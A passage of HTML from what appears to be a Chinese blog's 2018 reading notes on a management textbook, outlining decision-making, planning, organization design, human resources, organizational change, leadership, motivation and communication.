、对关系数据库查询以及内部集成的工程系统、商业系统、数据采集和外部集成</li></ul></li><li>从管理思想、软件产品、管理系统三个层次理解ERP<ul><li>第一，ERP 是一整套企业管理系统体系标准，其实质是在MRPII 基础上进一步发展而成的面向供应链(Supply Chain ) 的管理思想；</li><li>第二，ERP 综合应用了客户机／服务器体系、关系数据库结构、面向对象技术、图形用户界面、第四代语言(4GL) 、网络通信等信息产业成果，是以管理企业整体资源的管理思想为灵魂的软件产品</li><li>第三，ERP 是集整合企业管理理念、业务流程、基础数据、人力物力、计算机硬件和软件于一体的企业资源管理系统</li></ul></li><li>一般的管理主要包括三方面的内容<ul><li>财务管理模块<ul><li>会计核算</li><li>财务管理</li></ul></li><li>生产控制管理模块<ul><li>主生产计划</li><li>物料需求计划</li><li>能力需求计划</li><li>车间控制</li><li>制造标准</li></ul></li><li>物流管理<ul><li>分销管理</li><li>库存控制</li><li>采购管理</li></ul></li></ul></li></ul></li></ul></li></ul></li></ul><h3 id="综合案例"><a href="#综合案例" class="headerlink" title="综合案例"></a>综合案例</h3><ul><li>中国乳业上演生死时速</li><li>法国总部来了个中国人</li></ul><h2 id="第二篇、决策与计划"><a href="#第二篇、决策与计划" class="headerlink" title="第二篇、决策与计划"></a>第二篇、决策与计划</h2><h3 id="五、决策与决策方法"><a href="#五、决策与决策方法" class="headerlink" title="五、决策与决策方法"></a>五、决策与决策方法</h3><ul><li>决策与决策理论<ul><li>决策的定义<ul><li>在本书中，我们采用路易斯、古德曼和范特(Lewis , Goodman and Fandt,1998) 对决策的定义：“管理者识别并解决问题的过程，或者管理者利用机会的过程。”</li><li>对于这一定义，可作如下理解<ul><li>决策的主体是管理者，因为决策是管理的一项职能</li><li>决策的本质是一个过程，这一过程由多个步骤组成，尽管各人对决策过程的理解不尽相同</li><li>决策的目的是解决问题或利用机会，这就是说，决策不仅仅是为了解决问题，有时也是为了利用机会</li></ul></li></ul></li><li>决策的原则<ul><li>决策遵循的是满意原则，而不是最优原则</li><li>使决策达到最优，必须具备以下条件<ul><li>容易获得与决策有关的全部信息</li><li>真实了解全部信息的价值所在，并据此拟定出所有可能的方案</li><li>准确预测每个方案在未来的执行结果</li></ul></li><li>现实中，上述这些条件往往得不到满足<ul><li>组织内外的很多因素都会对组织的运行产生不同程度的影响，但决策者很难收集到反映这些因素的一切信息</li><li>对于收集到的有限信息，决策者的利用能力也是有限的，从而决策者只能拟定数量有限的方案</li><li>任何方案都要在未来实施，而未来是不确定的</li></ul></li></ul></li><li>决策的依据<ul><li>管理者在决策时离不开信息。信息的数量和质董直接影响决策水平</li></ul></li><li>决策理论<ul><li>古典决策理论<ul><li>古典决策理论是基于“经济人“假设提出的，主要盛行于20世纪50年代以前</li><li>古典决策理论的主要内容有以下几个方面<ul><li>决策者必须全面掌握有关决策环境的信息情报</li><li>决策者要充分了解有关备选方案的情况；</li><li>决策者应建立—个合理的层级结构，以确保命令的有效执行；</li><li>决策者进行决策的目的始终在于使本组织获取最大的经济利益</li></ul></li></ul></li><li>行为决策理论<ul><li>行为决策理论的发展始于20世纪50年代</li><li>行为决策理论的主要内容有以下几个方面<ul><li>人的理性介于完全理性和非理性之间，即人是有限理性的，这是因为在高度不确定和极其复杂的现实决策环境中，人的知识、想象力和计算力是有限的</li><li>决策者在识别和发现问题中容易受知觉上的偏差的影响，而在对未来的状况做出判断时，直觉的运用往往多于逻辑分析方法的运用</li><li>由于受决策时间和可利用资源的限制，决策者即使充分了解和掌握有关决策环境的信息情报，也只能做到尽量了解各种备选方案的情况，而不可能做到全部了解，决策者选择的理性是相对的</li><li>在风险型决策中，与对经济利益的考虑相比，决策者对待风险的态度对决策起着更为重要的作用</li><li>决策者在决策中往往只求满意的结果，而不愿费力寻求最佳方案</li></ul></li></ul></li></ul></li></ul></li><li>决策过程<ul><li>诊断问题（识别机会）</li><li>明确目标</li><li>拟定方案</li><li>筛选方案</li><li>执行方案</li><li>评估效果</li></ul></li><li>决策的影响因素 <img src="/2018/10/27/2018-10-27-readingNoteManagement/2018_10_31_15.bmp"></li><li>决策方法<ul><li>定性决策方法<ul><li>以下几点是定性决策方法仍有用武之地的理由<ul><li>人们面对信息不完全的决策问题时，比如面对新的环境里出现的新问题，难以使用对数据依赖程度很高的定量方法</li><li>当决策间题与人们的主观意愿关系密切时，企如定箭分析的目标函数如何确定，特别是当多个决策者意见有分歧时，需要采用定性方法或以定性为主的决策方法。</li><li>当决策问题十分复杂，现有的定量分析方法和计算工具难以胜任时，人们也不得不进行粗略的估计和采用定性分析方法</li></ul></li><li>集体决策方法<ul><li>头脑风暴法<ul><li>各自发表自己的意见，对别人的建议不作评论</li><li>建议不必深思熟虑，越多越好</li><li>鼓励独立思考、奇思妙想；</li><li>可以补充完善已有的建议。</li></ul></li><li>名义小组技术</li><li>德尔菲技术<ul><li>根据问题的特点，选择和邀请做过相关研究或有相关经验的专家</li><li>将与问题有关的信息分别提供给专家，请他们各自独立发表自己的意见，并写成书面材料。</li><li>管理者收集并综合专家们的意见后，将综合意见反馈给各位专家，请他们再次发表意见如果分歧很大，可以开会集中讨论；否则，管理者分头与专家联络</li><li>如此反复多次，最后形成代表专家组意见的方案</li></ul></li></ul></li><li>有关活动方向的决策方法<ul><li>经营单位组合分析法 <img src="/2018/10/27/2018-10-27-readingNoteManagement/2018_10_31_16.bmp"></li><li>政策指导矩阵 <img src="/2018/10/27/2018-10-27-readingNoteManagement/2018_10_31_17.bmp"></li></ul></li></ul></li><li>定量决策方法<ul><li>确定型决策方法<ul><li>分析与建模</li><li>模型求解</li></ul></li><li>不确定型决策方法<ul><li>小中取大法</li><li>大中取大法</li><li>最小最大后悔值法</li></ul></li><li>风险型决策方法<ul><li>最大期望收益准则</li><li>最大期望效用准则</li><li>面对小概率事件需要注意的问题</li><li>多阶段决策问题与决策树</li></ul></li></ul></li><li>计算机模拟决策方法<ul><li>输人基本参数</li><li>模拟第一次投资</li><li>模拟多次投资</li><li>利用“模拟运算表”进行分析</li></ul></li><li>决策模拟演练<ul><li>企业竞争模拟及软件简介</li><li>企业竞争模拟的组织与特点</li></ul></li></ul></li></ul><h3 id="六、计划与计划工作"><a href="#六、计划与计划工作" class="headerlink" title="六、计划与计划工作"></a>六、计划与计划工作</h3><ul><li>计划的概念及其性质<ul><li>计划的概念<ul><li>What —做什么？目标与内容</li><li>Why 一为什么做？原因</li><li>Who -一谁去做？人员</li><li>Where—何地做？地点</li><li>When-何时做？时间</li><li>How -怎样做？方式、手段</li></ul></li><li>计划与决策<ul><li>决策与计划是两个既相互区别、又相互联系的概念</li></ul></li><li>计划的性质<ul><li>计划工作为实现组织目标服务</li><li>计划工作是管理活动的桥梁，是组织、领导和控制等管理活动的基础</li><li>计划工作具有普遍性和秩序性</li><li>计划工作要追求效率</li></ul></li></ul></li><li>计划的类型 <img src="/2018/10/27/2018-10-27-readingNoteManagement/2018_10_31_18.bmp"> <img src="/2018/10/27/2018-10-27-readingNoteManagement/2018_10_31_19.bmp"> <img src="/2018/10/27/2018-10-27-readingNoteManagement/2018_10_31_20.bmp"></li><li>计划编制过程 <img src="/2018/10/27/2018-10-27-readingNoteManagement/2018_10_31_21.bmp"></li></ul><h3 id="七、战略性计划与计划实施"><a href="#七、战略性计划与计划实施" class="headerlink" title="七、战略性计划与计划实施"></a>七、战略性计划与计划实施</h3><ul><li>战略环境分析<ul><li>外部一般环境<ul><li>政治环境包括一个国家的社会制度，执政党的性质，政府的方针、政策、法令等</li><li>社会文化环境包括一个国家或地区居民的教育程度和文化水平、宗教信仰、风俗习惯、审美观点、价值观念等</li><li>经济环境主要包括宏观和微观两个方面的内容。宏观经济环境主要指一个国家的人口数量及其增长趋势，国民收入、国民生产总值及其变化情况以及通过这些指标能够反映的国民经济发展水平和发展速度。微观经济环境主要指企业所在地区或所服务地区的消费者的收人水平、消费偏好、储蓄情况、就业程度等因素。</li><li>技术环境除了要考察与企业所处领域的活动直接相关的技术手段的发展变化外，还应及时了解： ＠国家对科技开发投资和支持的重点组）该领域技术发展动态和研究开发费用总额；＠技术转移和技术商品化速度；＠专利及其保护情况，等等</li><li>自然环境主要指企业经营所处的地理位置、气候条件和资源禀赋状况等自然因素。</li></ul></li><li>行业环境 <img src="/2018/10/27/2018-10-27-readingNoteManagement/2018_10_31_22.bmp"></li><li>竞争对手</li><li>企业自身 <img src="/2018/10/27/2018-10-27-readingNoteManagement/2018_10_31_23.bmp"></li><li>顾客（目标市场） <img src="/2018/10/27/2018-10-27-readingNoteManagement/2018_10_31_24.bmp"></li></ul></li><li>战略性计划选择 <img src="/2018/10/27/2018-10-27-readingNoteManagement/2018_10_31_25.bmp"> <img src="/2018/10/27/2018-10-27-readingNoteManagement/2018_10_31_26.bmp"> <img src="/2018/10/27/2018-10-27-readingNoteManagement/2018_10_31_27.bmp"></li><li>计划的组织实施<ul><li>目标管理<ul><li>目标管理基本思想<ul><li>企业的任务必须转化为目标，企业管理人员必须通过这些目标对下级进行领导，并以此来保证企业总目标的实现</li><li>目标管理是一种程序，使一个组织中的上下各级管理人员统一起来制定共同的目标，确定彼此的责任，并将此项责任作为指导业务和衡量各自贡献的准则</li><li>每个企业管理人员或工人的分目标就是企业总目标对他的要求，同时也是这个企业管理人员或工人对企业总目标的贡献</li><li>管理人员和工人是依据设定的目标进行自我管理，他们以所要达到的目标为依据，进行自我指挥自我控制，而不是由他的_f级来指挥和控制</li><li>企业管理人员对下级进行考核和奖惩也是依据这些分目标</li></ul></li><li>目标的性质<ul><li>目标的层次性</li><li>目标网络</li><li>目标的可考核性</li><li>目标的可接受性</li><li>目标的挑战性</li><li>伴随信息反馈性</li></ul></li><li>目标管理的过程<ul><li>制定目标</li><li>明确组织的作用</li><li>执行目标</li><li>评价成果</li><li>实行奖惩</li><li>制定新目标并开始新的目标管理循环</li></ul></li></ul></li><li>滚动计划法<ul><li>滚动计划法的基本思想</li><li>滚动计划法的评价</li></ul></li><li>网络计划技术<ul><li>网络计划技术的基本步骤 <img src="/2018/10/27/2018-10-27-readingNoteManagement/2018_10_31_28.bmp"></li><li>网络图</li><li>网络计划技术的评价<ul><li>该技术能清晰地表明整个工程的各个项目的时间顺序和相互关系，并指出了完成任务的关键环节和路线</li><li>可对工程的时间进度与资源利用实施优化</li><li>可事先评价达到目标的可能性</li><li>便千组织与控制</li><li>易于操作，并具有广泛的应用范围，适用于各行各业以及各种任务</li></ul></li></ul></li></ul></li></ul><h3 id="综合案例-1"><a href="#综合案例-1" class="headerlink" title="综合案例"></a>综合案例</h3><ul><li>准确决策与盲目投资</li><li>战略决策是成功之母</li></ul><h2 id="第三篇、组织"><a href="#第三篇、组织" class="headerlink" title="第三篇、组织"></a>第三篇、组织</h2><h3 id="八、组织设计"><a href="#八、组织设计" class="headerlink" title="八、组织设计"></a>八、组织设计</h3><ul><li>组织与组织设计<ul><li>组织设计的必要性分析</li><li>组织设计的任务和原则<ul><li>组织设计的任务 <img src="/2018/10/27/2018-10-27-readingNoteManagement/2018_10_31_29.bmp"> * 为了达到组织设计的理想效果，组织设计者需要完成以下几项工作 * 职能与职务的分析与设计 * 部门设计 * 层级设计</li><li>组织设计的原则<ul><li>专业化分工的原则</li><li>统一指挥原则</li><li>控制幅度原则</li><li>权责对等原则</li><li>柔性经济原则</li></ul></li></ul></li><li>组织设计的影晌因素<ul><li>环境的影响<ul><li>环境包括一般环境和特定环境两部分</li><li>组织设计者可以通过以下几种方法提高组织对环境的应变性<ul><li>对传统的职位和职能部门进行相应的调整</li><li>根据外部环境的不确定程度设计不同类型的组织结构</li><li>根据组织的差别性、整合性程度设计不同的组织结构</li><li>通过加强计划和对环境的预测减少不确定性</li><li>通过组织间合作尽量减小组织自身要素资源对环境的过度依赖性</li></ul></li></ul></li><li>战略的影响<ul><li>战略发展有四个不同阶段<ul><li>数量扩大阶段</li><li>地区开拓阶段</li><li>纵向联合发展阶段</li><li>产品多样化阶段</li></ul></li><li>四种战略类型<ul><li>防御者型</li><li>探险者型</li><li>分析者型</li><li>反应者型</li></ul></li></ul></li><li>技术的影晌</li><li>组织规模与生命周期的影响<ul><li>大型组织与小型组织在组织结构上的区别主要体现在以下几个方面。<ul><li>规范化程度</li><li>集权化程度</li><li>复杂化程度</li><li>人员结构比率</li></ul></li><li>组织生命周期各个阶段的特点有以下几个方面<ul><li>创业阶段</li><li>集合阶段</li><li>规范化阶段</li><li>精细阶段</li></ul></li></ul></li></ul></li></ul></li><li>组织的部门化<ul><li>组织部门化的基本原则<ul><li>因事设职和因人设职相结合的原则</li><li>分工与协作相结合的原则</li><li>精简高效的部门设计原则</li></ul></li><li>组织部门化的基本形式<ul><li>职能部门化 <img src="/2018/10/27/2018-10-27-readingNoteManagement/2018_10_31_30.bmp"></li><li>产品或服务部门化 <img src="/2018/10/27/2018-10-27-readingNoteManagement/2018_10_31_31.bmp"></li><li>地域部门化 <img src="/2018/10/27/2018-10-27-readingNoteManagement/2018_10_31_32.bmp"></li><li>顾客部门化 <img src="/2018/10/27/2018-10-27-readingNoteManagement/2018_10_31_33.bmp"></li><li>流程部门化 <img src="/2018/10/27/2018-10-27-readingNoteManagement/2018_10_31_34.bmp"></li><li>矩阵型结构 <img src="/2018/10/27/2018-10-27-readingNoteManagement/2018_10_31_35.bmp"></li><li>动态网络型结构 <img src="/2018/10/27/2018-10-27-readingNoteManagement/2018_10_31_36.bmp"></li></ul></li></ul></li><li>组织的层级化<ul><li>组织的层级化与管理幅度<ul><li>管理幅度与组织层级的互动性 <img src="/2018/10/27/2018-10-27-readingNoteManagement/2018_10_31_37.bmp"></li><li>管理幅度设计的影响因素<ul><li>工作能力</li><li>工作内容和性质<ul><li>主管所处的管理层次</li><li>下属工作的相似性</li><li>计划的完善程度</li><li>非管理事务的多少</li></ul></li><li>工作条件<ul><li>助手的配备情况</li><li>信息手段的配备情况</li><li>工作地点的相近性</li></ul></li><li>工作环境</li></ul></li></ul></li><li>层级设计需要解决的主要问题：集权与分权<ul><li>权力的性质与特征<ul><li>职权在被接受之前必须具备四个条件<ul><li>在做决定时，下属必须能够了解沟通的内容；</li><li>在做决定时，下属必须深信他的要求和组织的宗旨是一致的；</li><li>在做决定时，下属必须深信他的要求跟他本人的兴趣是一致的；</li><li>在做决定时，下属在体力和精力上应能予以配合，职权的行使不能逾越他们的能力和服从范围</li></ul></li><li>职权分为三种形式<ul><li>直线职权</li><li>参谋职权</li><li>职能职权</li></ul></li><li>管理中的职权来源于以下三个方面<ul><li>在层级组织中居于某一特殊职位所拥有的命令指挥权；</li><li>由于个人具备某些核心专长或高级技术知识而拥有的技术能力职权；</li><li>由千个人能够有效地激励、领导和影响他人而拥有的管理能力职权。</li></ul></li></ul></li><li>组织层级化设计中的集权与分权<ul><li>组织分权程度的四条标准。<ul><li>较低的管理层次作出的决策数量越多，分权程度就越大。</li><li>较低的管理层次作出的决策重要性越大，分权程度就越大。</li><li>较低的管理层次作出的决策影响面越大，分权程度就越大。</li><li>较低的管理层次所作的决策审核越少，分权程度就越大</li></ul></li><li>影响组织分权程度的主要因素<ul><li>组织规模的大小</li><li>政策的统一性</li><li>员工的数量和基本素质</li><li>组织的可控性</li><li>组织所处的成长阶段</li></ul></li></ul></li></ul></li><li>组织层级设计中的授权<ul><li>授权的含义及其有效性<ul><li>授权的含义有<ul><li>分派任务</li><li>授予权力或职权</li><li>明确责任</li></ul></li><li>有效授权的要素<ul><li>信息共享</li><li>提高授权对象的知识与技能</li><li>充分放权</li><li>奖励绩效</li></ul></li><li>授权的原则<ul><li>重要性原则</li><li>适度原则</li><li>权责一致原则</li><li>级差授权原则</li></ul></li></ul></li></ul></li></ul></li></ul><h3 id="九、人力资源管理"><a href="#九、人力资源管理" class="headerlink" title="九、人力资源管理"></a>九、人力资源管理</h3><ul><li>人力资源计划<ul><li>人力资源计划的任务<ul><li>系统评价组织中人力资源的需求量</li><li>选配合适的人员</li><li>制定和实施人员培训计划</li></ul></li><li>人力资源计划的过程 <img src="/2018/10/27/2018-10-27-readingNoteManagement/2018_10_31_38.bmp"> * 评估现有的人力资源状况 * 评估未来人力资源状况 * 制定一套相适应的人力资源计划</li><li>人力资源计划编制的原则<ul><li>既要保证企业短期自下而上的需要，也要能促进企业的长期发展</li><li>既要能促进员工现有人力资源价值的实现，又要能为员工的长期发展提供机会</li></ul></li></ul></li><li>员工的招聘与解聘<ul><li>员工招聘的标准<ul><li>管理的愿望<ul><li>强烈的管理愿望是有效开展工作的基本前提</li></ul></li><li>良好的品德<ul><li>良好的品德是每个组织成员都应具备的基本素质</li></ul></li><li>勇千创新的精神</li><li>较高的决策能力</li></ul></li><li>员工招聘的来源与方法<ul><li>员工招聘的来源<ul><li>组织可以通过以下几种渠道来获取必要的人力资源<ul><li>广告应聘者</li><li>员工或关联人员推荐</li><li>职业介绍机构推荐</li><li>其他来源</li></ul></li><li>外部招聘<ul><li>优势：<ul><li>具备难得的“外部竞争优势”</li><li>有利千平息并缓和内部竞争者之间的紧张关系</li><li>能够为组织输送新鲜血液</li></ul></li><li>局限性<ul><li>外聘者对组织缺乏深入了解</li><li>组织对外聘者缺乏深入了解</li><li>外聘对内部员工的积极性造成打击</li></ul></li></ul></li><li>内部提升<ul><li>优点<ul><li>有利于调动员工的工作积极性</li><li>有利于吸引外部人才</li><li>有利于保证选聘工作的正确性</li><li>有利于被聘者迅速展开工作</li></ul></li><li>弊端<ul><li>可能会导致组织内部“近亲繁殖“现象的发生</li><li>可能会引起同事之间的矛盾</li></ul></li></ul></li><li>选择招聘方式时应注意以下几个方面的因素<ul><li>所需选聘人才的层次</li><li>企业经营环境的特点</li><li>企业所处的发展阶段</li><li>企业战略以及与之相关的企业文化调整的需要</li></ul></li></ul></li><li>员工招聘的程序与方法<ul><li>制定并落实招聘计划</li><li>对应聘者进行初选</li><li>对初选合格者进行知识与能力的考核<ul><li>智力与知识测试</li><li>竞聘演讲与答辩</li><li>案例分析与候选人实际能力考核</li></ul></li><li>选定录用员工</li><li>评价和反馈招聘效果</li></ul></li></ul></li><li>员工的解聘 <img src="/2018/10/27/2018-10-27-readingNoteManagement/2018_10_31_39.bmp"></li></ul></li><li>员工培训<ul><li>员工培训的目标<ul><li>补充知识</li><li>发展能力</li><li>转变观念</li><li>交流信息</li></ul></li><li>员工培训的方法<ul><li>导入培训</li><li>在职培训</li><li>离职培训</li></ul></li><li>管理人员培训的方法<ul><li>工作轮换</li><li>设置助理职务</li><li>临时职务与彼得原理</li></ul></li></ul></li><li>绩效评估<ul><li>绩效评估的作用<ul><li>绩效评估为最佳决策提供了重要的参考依据</li><li>绩效评估为组织发展提供了重要的支持</li><li>绩效评估为员工提供了一面有益的“镜子”</li><li>绩效评估为确定员工的工作报酬提供依据</li><li>绩效评估为员工潜能的评价以及相关人事调整提供了依据</li></ul></li><li>绩效评估的程序与方法<ul><li>确定特定的绩效评估目标</li><li>确定考评贵任者</li><li>评价业绩</li><li>公布考评结果，交流考评意见</li><li>根据考评结论，将绩效评估的结论备案</li></ul></li></ul></li></ul><h3 id="十、组织变革与组织文化"><a href="#十、组织变革与组织文化" class="headerlink" title="十、组织变革与组织文化"></a>十、组织变革与组织文化</h3><ul><li>组织变革的一般规律<ul><li>组织变革的动因<ul><li>组织变革的必要性分析</li><li>组织变革的原因<ul><li>外部环境因素<ul><li>宏观社会经济环境的变化</li><li>科技进步的影响</li><li>环境资源的影响</li><li>竞争观念的改变</li></ul></li><li>内部环境因素<ul><li>组织机构适时调整的要求</li><li>保障信息畅通的要求</li><li>克服组织低效率的要求</li><li>快速决策的要求</li><li>提高组织整体管理水平的要求</li></ul></li></ul></li></ul></li><li>组织变革的类型和目标<ul><li>组织变革的类型<ul><li>战略性变革</li><li>结构性变革</li><li>流程主导性变革</li><li>以人为中心的变革</li></ul></li><li>组织变革的目标<ul><li>提高组织的环境适应性</li><li>提高管理者的环境适应性</li><li>提高员工的环境适应性</li></ul></li></ul></li><li>组织变革的内容<ul><li>人员变革</li><li>结构变革</li><li>技术与任务变革</li></ul></li></ul></li><li>管理组织变革<ul><li>组织变革的过程与程序<ul><li>组织变革的过程<ul><li>解冻阶段</li><li>变革阶段</li><li>再冻结阶段</li></ul></li><li>组织变革的程序<ul><li>诊断组织现状，发现变革征兆</li><li>分析变革因素，制定改革方案</li><li>选择正确方案，实施变革计划</li><li>评价变革效果，及时进行反馈</li></ul></li></ul></li><li>组织变革的阻力及其管理<ul><li>组织变革的阻力<ul><li>个人阻力<ul><li>利益上的影响</li><li>心理上的影响</li></ul></li><li>团体阻力<ul><li>组织结构变动的影响</li><li>人际关系调整的影响</li></ul></li></ul></li><li>消除组织变革阻力的管理对策<ul><li>客观分析变革的推力和阻力的强弱</li><li>创新组织文化</li><li>创新策略方法和手段</li></ul></li></ul></li><li>组织变革中的压力及其管理<ul><li>压力的定义</li><li>压力的起因及其特征<ul><li>组织因素</li><li>个人因素</li><li>压力的特征<ul><li>生理上的反应</li><li>心理上的反应</li><li>行为上的反应</li></ul></li></ul></li><li>压力的释解</li></ul></li><li>组织冲突及其管理<ul><li>组织冲突的影响<ul><li>竞争胜利对组织的影响有以下几方面。<ul><li>组织内部更加团结，成员对团体更加忠诚，这有利千加强和保持团体的凝聚力</li><li>组织内部气氛更为轻松，紧张的情绪有所消除，同时也容易失去继续奋斗的意志，容易滋生骄傲和得意忘形的情绪</li><li>强化了组织内部的协作，组织更为关心成员的心理需求，但对于完成工作及任务的关心则有减少的趋势</li><li>组织成员容易感到满足和舒畅，认为竞争胜利证实了自己的长处和对方的弱点，因此，反而不愿对其自身的不足重作估计和弥补，也不想重新反思团体是否还需要根据环境的变化作进一步的改善。</li></ul></li><li>竞争失败对组织的影响有以下几方面<ul><li>如果胜败的界限不是很分明，则团体会以种种借口和理由来掩饰自己的失败，团体之间也容易产生偏见，每个团体总是只看到对方的弱处，而忽视对方的长处</li><li>当团体发现失败是无可置疑的事实时，依据团体的基本状况，如成员平时的团结程度、失败的程度、对挫折的忍受程度等，可分为两种情况：一种情况是团体内部可能发生混乱与斗争，攻击现象频频发生，团体最终趋于解散；另一种情况是全体成员可能会知耻而奋起，通过努力探寻失败的原因，大胆改进，勤奋工作，以求走出失败的困境</li><li>竞争失败后的团体往往不太关心成员的心理需求，而只集中精力于自己的本职工作，组织中的组织性和纪律性明显增强，组织有集权化的倾向。</li><li>成员以往的自信心会受到极大的打击，过去的固执和偏见经过失败体验之后不得不重新进行检讨和反思，实际上，这正给了组织一个检讨、改革的机会。</li></ul></li></ul></li><li>组织冲突的类型<ul><li>正式组织与非正式组织之间的冲突</li><li>直线与参谋之间的冲突</li><li>委员会成员之间的冲突</li></ul></li><li>组织冲突的避免</li></ul></li></ul></li><li>组织文化及其发展<ul><li>组织文化的概念及其特征<ul><li>组织文化的基本概念</li><li>组织文化的主要特征<ul><li>超个体的独特性</li><li>相对稳定性</li><li>融合继承性</li><li>发展性</li></ul></li></ul></li><li>组织文化的结构与内容<ul><li>组织文化的结构<ul><li>潜层次的精神层</li><li>表层的制度系统</li><li>显现层的组织文化载体</li></ul></li><li>组织文化的内容<ul><li>组织的价值观</li><li>组织精神</li><li>伦理规范</li></ul></li></ul></li><li>组织文化的功能与塑造<ul><li>组织文化的功能<ul><li>整合功能</li><li>适应功能</li><li>导向功能</li><li>发展功能</li><li>持续功能</li></ul></li><li>组织文化的形成<ul><li>管理者的倡导</li><li>组织成员的接受：“社会化”与“预社会化”</li></ul></li><li>组织文化的塑造途径<ul><li>确立正确的组织价值观<ul><li>组织价值标准要正确、明晰、科学，具有鲜明特点。</li><li>组织价值观和组织文化要体现组织的宗旨、经营战略和发展方向。</li><li>要切实调查本组织员工的认可程度和接纳程度，使之与本组织员工的基本素质相和谐，过高或过低的标准都很难奏效</li><li>选择组织价值观要发挥员工的创造精神，认真听取员工的各种意见，并经过自上而下和自下而上的多次反复，审慎地筛选出既符合本组织特点又反映员工心态的组织价值观和组织文化模式。</li></ul></li><li>强化员工的认同感<ul><li>利用一切宣传媒体，宣传组织文化的内容和精要，以创造浓厚的环境氛围。</li><li>培养和树立典型</li><li>加强相关培训教育</li></ul></li><li>提炼定格<ul><li>精心分析</li><li>全面归纳</li><li>精炼定格</li></ul></li><li>巩固落实</li><li>在发展中不断丰富和完善</li></ul></li></ul></li></ul></li></ul><h3 id="综合案例-2"><a href="#综合案例-2" class="headerlink" title="综合案例"></a>综合案例</h3><ul><li>万维公司的组织结构变革</li><li>广东北电——人性化管理</li></ul><h2 id="第四篇、领导"><a href="#第四篇、领导" class="headerlink" title="第四篇、领导"></a>第四篇、领导</h2><h3 id="十一、领导概论"><a href="#十一、领导概论" class="headerlink" title="十一、领导概论"></a>十一、领导概论</h3><ul><li>领导的内涵<ul><li>领导和管理 <img src="/2018/10/27/2018-10-27-readingNoteManagement/2018_10_31_43.bmp"></li><li>领导的作用<ul><li>指挥作用</li><li>协调作用</li><li>激励作用</li></ul></li><li>领导权力的来源<ul><li>法定性权力</li><li>奖赏性权力</li><li>惩罚性权力</li><li>感召性权力</li><li>专长性权力</li></ul></li></ul></li><li>领导风格类型<ul><li>按权力运用方式划分<ul><li>集权式领导者</li><li>民主式领导者</li></ul></li><li>按创新方式划分<ul><li>魅力型领导者</li><li>变革型领导者</li></ul></li><li>按思维方式划分<ul><li>事务型领导者</li><li>战略型领导者</li></ul></li></ul></li><li>领导理论<ul><li>领导特性论<ul><li>努力进取，渴望成功</li><li>强烈的权力欲望</li><li>正直诚信，言行一致</li><li>充满自信</li><li>追求知识和信息</li></ul></li><li>领导行为论<ul><li>密歇根大学的研究<ul><li>一是工作（生产）导向型的领导行为</li><li>二是员工导向型领导行为</li></ul></li><li>俄亥俄州立大学的研究</li><li>管理方格论</li></ul></li><li>领导情景论<ul><li>菲德勒权变理论 <img src="/2018/10/27/2018-10-27-readingNoteManagement/2018_10_31_40.bmp"> <img src="/2018/10/27/2018-10-27-readingNoteManagement/2018_10_31_41.bmp"></li><li>路径一目标理论</li><li>领导生命周期理论<ul><li>指导型(telling) 领导（高任务—低关系），领导者定义角色，告诉下属应该做什么、怎样做以及在何时何地做</li><li>推销型(selling ) 领导（高任务一高关系），领导者同时提供指导行为与支持行为</li><li>参与型(participating) 领导（低任务一高关系），领导者与下属共同决策，领导者的主要角色是提供便利条件和沟通。</li><li>授权型(delegating ) 领导（低任务一低关系），领导者提供较少的指导或支持<img src="/2018/10/27/2018-10-27-readingNoteManagement/2018_10_31_42.bmp"></li></ul></li></ul></li></ul></li></ul><h3 id="十二、激励"><a href="#十二、激励" class="headerlink" title="十二、激励"></a>十二、激励</h3><ul><li>激励原理<ul><li>激励的概念与对象<ul><li>激励的概念</li><li>激励的对象</li></ul></li><li>激励与行为<ul><li>激励力＝效价x 期望值</li></ul></li><li>激励产生的内因与外因</li><li>需要的管理学意义</li></ul></li><li>激励的需要理论<ul><li>需要层次论<ul><li>生理的需要</li><li>安全的需要</li><li>社交的需要</li><li>尊重的需要</li><li>自我实现的需要</li></ul></li><li>双因素理论 <img src="/2018/10/27/2018-10-27-readingNoteManagement/2018_10_31_44.bmp"></li><li>成就需要论<ul><li>成就的需要</li><li>依附的需要</li><li>权力的需要</li></ul></li><li>X 理论和Y 理论<ul><li>X 理论<ul><li>员工天性好逸恶劳，只要可能，就会躲避工作；</li><li>以自我为中心，漠视组织要求；</li><li>员工只要有可能就会逃避责任，安于现状，缺乏创造性；</li><li>不喜欢工作，需要对他们采取强制措施或惩罚办法，迫使他们实现组织目标</li></ul></li><li>y 理论<ul><li>员工并非好逸恶劳，而是自觉勤奋，喜欢工作；</li><li>员工有很强的自我控制能力，在工作中执行完成任务的承诺；</li><li>一般而言，每个人不仅能够承担责任，而且还主动寻求承担责任；</li><li>绝大多数人都具备做出正确决策的能力。</li></ul></li></ul></li></ul></li><li>激励的过程理论<ul><li>公平理论<ul><li>横向比较</li><li>纵向比较</li></ul></li><li>期望理论</li><li>激励的强化理论<ul><li>正强化</li><li>负强化</li></ul></li></ul></li><li>激励实务<ul><li>薪酬管理<ul><li>绩效工资</li><li>分红</li><li>总奖金</li><li>知识工资</li></ul></li><li>员工持股计划</li><li>灵活的工作日程</li><li>目标管理</li></ul></li></ul><h3 id="十三、沟通"><a href="#十三、沟通" class="headerlink" title="十三、沟通"></a>十三、沟通</h3><ul><li>沟通的原理<ul><li>沟通及其作用<ul><li>通过沟通向交往对象提供行为建议；</li><li>通过沟通以积极或消极的方式激励或约束他人行为；</li><li>通过沟通向上司、下属或合作单位提供与决策制定或执行有关的各种信息</li><li>通过沟通获得与组织的活动相关的各种信息。</li></ul></li><li>沟通的过程 <img src="/2018/10/27/2018-10-27-readingNoteManagement/2018_10_31_45.bmp"> * 发送者需要向接受者传送信息或者需要接受者提供信息 * 发送者将这些信息译成接受者能够理解的一系列符号 * 将上述符号传递给接受者 * 接受者接受这些符号 * 接受者将这些符号译为具有特定含义的信息 * 接受者理解信息的内容 * 发送者通过反馈来了解他想传递的信息是否被对方准确无误地接受</li><li>沟通的类别 <img src="/2018/10/27/2018-10-27-readingNoteManagement/2018_10_31_46.bmp"> <img src="/2018/10/27/2018-10-27-readingNoteManagement/2018_10_31_47.bmp"></li></ul></li><li>组织沟通<ul><li>个体间沟通</li><li>团队沟通</li><li>组织间沟通</li></ul></li><li>沟通管理<ul><li>有效沟通的障碍<ul><li>个人因素<ul><li>有选择地接受，</li><li>沟通技巧的差异。</li></ul></li><li>人际因素</li><li>结构因素</li><li>技术因素</li></ul></li><li>有效沟通的实现<ul><li>明了沟通的重要性，正确对待沟通</li><li>培养“听”的艺术 <img 